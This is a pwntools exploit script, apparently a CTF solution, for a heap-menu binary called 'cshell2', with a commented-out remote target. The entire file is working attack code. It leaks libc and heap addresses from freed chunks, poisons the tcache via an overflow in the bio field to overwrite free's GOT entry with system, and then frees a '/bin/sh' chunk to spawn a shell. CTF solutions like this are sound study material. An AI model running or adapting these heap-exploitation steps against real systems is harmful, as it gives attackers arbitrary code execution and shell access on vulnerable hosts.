from pwn import *
import sys

elf = ELF("./cshell2")
libc = ELF("libc.so.6")

io = process(elf.path)
# io = remote("be.ax", 31667)

# gdb.attach(io, '''
#    break *0x401b40
# ''')

def select_cmd(x):
    io.sendlineafter(b"5 re-age user\n", str(x).encode())

def select_idx(x):
    io.sendlineafter(b"index: ", str(x).encode())

def add(idx, size, first, middle, last, age, bio):
    select_cmd(1)
    select_idx(idx)
    io.sendlineafter(b"Enter size (1032 minimum): ", str(size).encode())
    io.sendlineafter(b"Input firstname: ", first.encode())
    io.sendlineafter(b"Input middlename: ", middle.encode())
    io.sendlineafter(b"Input lastname: ", last.encode())
    io.sendlineafter(b"Input age: ", str(age).encode())
    io.sendlineafter(b"Input bio: ", bio.encode())

def show(idx):
    select_cmd(2)
    select_idx(idx)
    io.recvuntil(b"Name\n last: ")
    last = io.recvuntil(b" first: ")
    first = io.recvuntil(b" middle: ")
    middle = io.recvuntil(b" age: ")
    age = io.recvuntil(b"\nbio: ")
    bio = io.recvline()
    return first[0:-9], middle[0:-6], last[0:-8], age[0:-6], bio[0:-1]

def delete(idx):
    select_cmd(3)
    select_idx(idx)

def edit(idx, first, middle, last, age, bio):
    select_cmd(4)
    select_idx(idx)
    io.sendlineafter(b"Input firstname: ", first.encode())
    io.sendlineafter(b"Input middlename: ", middle.encode())
    io.sendlineafter(b"Input lastname: ", last.encode())
    io.sendlineafter(b"Input age: ", str(age).encode())
    io.sendlineafter(b"Input bio: ", bio)

def re_age(idx, age):
    select_cmd(5)
    select_idx(idx)
    io.sendlineafter(b"new age: ", str(age).encode())

# offset from libc base to main_arena.top
offset = 0x7f91fce35000 - 0x7f91fcffccc0

# libc and heap adrress leak
add(0, 0x4f0, "", "", "", 1, "")
add(1, 0x4f0, "", "", "", 1, "")
add(2, 0x4f0, "", "", "", 1, "")
add(3, 0x4f0, "", "", "", 1, "")

delete(0)
delete(2)

add(0, 0x4f0, "", "", "", 1, "")
add(2, 0x4f0, "", "", "", 1, "")
x = show(0)
main_arena_96 = u64(x[0] + b"\x00" * (8 - len(x[0]))) - 0x0a + 0xc0
libc.address = main_arena_96 + offset
heap_addr = u64(x[1] + b"\x00" * (8 - len(x[1]))) & 0xffff000
print("libc addr: " + str(hex(libc.address)))
print("heap addr: " + str(hex(heap_addr)))

# GOT overwrite
add(4, 0x408, "", "", "", 1, "")
add(5, 0x408, "", "", "", 1, "")
add(6, 0x408, "/bin/sh\x00", "", "", 1, "")
delete(5)
delete(4)

bio = b"A" * (0x4f0 - 0x40)
bio += p64(0)
bio += p64(0x411)
bio += p64(((heap_addr + 0x16a0) >> 12) ^ (elf.got["free"] - 0x18))

edit(3, "", "", "", 1, bio)
add(4, 0x408, "", "", "", 1, "")
add(5, 0x408, "", "", "", libc.sym["system"], "")

delete(6)

io.interactive()